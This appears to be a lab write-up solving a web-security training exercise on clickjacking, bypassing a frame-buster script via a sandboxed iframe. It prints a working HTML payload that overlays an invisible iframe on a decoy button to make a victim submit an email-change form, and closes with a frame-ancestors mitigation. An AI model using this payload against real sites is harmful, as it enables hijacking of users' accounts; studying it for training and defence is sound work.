# Lab 02 — Clickjacking with a frame-buster script

> **Expert** · [Official lab](https://portswigger.net/web-security/clickjacking/frame-busting-script)

**Entry point:** the target page runs a frame-buster that escapes iframes —
bypass it with the iframe `sandbox` attribute.

## Solution

1. The site's script does `top.location = self.location` when framed.
2. An iframe with a restrictive `sandbox` cannot navigate the top frame —
   and `allow-forms` keeps the prefilled form functional:

```html
<style>
  iframe { position: relative; width: 700px; height: 500px; opacity: 0.0001;
           z-index: 2; }
  div    { position: absolute; top: 400px; left: 60px; z-index: 1; }
</style>
<div>Click the prize!</div>
<iframe sandbox="allow-forms"
        src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil-you.net"></iframe>
```

3. Align the decoy click zone over the submit button, deliver to victim —
   the buster script silently fails, the click submits the form — lab solved.

## Mitigation

Frame-busting scripts are unreliable. Use `frame-ancestors 'none'` — the
browser-enforced option that `sandbox` cannot defeat.
